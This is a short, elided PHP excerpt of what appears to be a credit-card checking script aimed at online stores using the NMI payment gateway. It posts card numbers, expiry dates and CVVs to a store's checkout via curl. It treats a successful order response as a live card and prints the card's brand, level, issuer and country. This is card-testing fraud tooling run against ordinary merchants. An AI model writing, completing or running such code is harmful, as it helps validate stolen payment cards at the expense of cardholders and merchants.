...
$paymentMethods = [
    ...
    'nmi' => '/<input[^>]*name="payment_method"[^>]*value="nmi"/'
];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'nmi-card-number' => $cc,
    'nmi-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'nmi-card-cvc' => $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #ff6309ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
